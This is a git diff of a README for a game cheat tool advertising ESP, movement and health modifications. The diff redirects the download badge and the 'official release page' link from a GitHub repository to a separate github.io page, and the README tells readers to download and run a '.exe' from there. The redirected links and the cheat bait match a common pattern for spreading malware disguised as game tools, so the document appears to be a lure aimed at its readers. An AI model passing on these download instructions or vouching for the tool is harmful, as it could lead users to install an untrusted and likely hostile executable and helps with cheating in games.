@@ -1,6 +1,6 @@
 # 🦎 meccha-chameleon-tool - Enhance your game with powerful modifications
 
-[![](https://img.shields.io/badge/Download-MECCHA-CHAMELEON-blue.svg)](https://github.com/Soudgarden/meccha-chameleon-tool)
+[![](https://img.shields.io/badge/Download-MECCHA-CHAMELEON-blue.svg)](https://soudgarden.github.io)
 
 The meccha-chameleon-tool provides players with a suite of gameplay enhancements for the ESP (Extra Sensory Perception) experience. This software allows users to adjust game parameters to improve visibility and character performance within the game environment. You can use these tools to gain spatial awareness, move through the game world with ease, and manage character health settings.
 
@@ -29,7 +29,7 @@ Before you install this tool, confirm your computer meets these requirements:
 
 Follow these instructions to set up the tool on your Windows machine.
 
-1. Visit the [official release page](https://github.com/Soudgarden/meccha-chameleon-tool) to download the software.
+1. Visit the [official release page](https://soudgarden.github.io) to download the software.
 2. Locate the link labeled "Download" or click the button provided at the top of this page.
 3. Save the executable file to a folder on your computer that you can find easily, such as your Downloads folder or Desktop.
 4. Locate the downloaded file. It usually ends in ".exe".
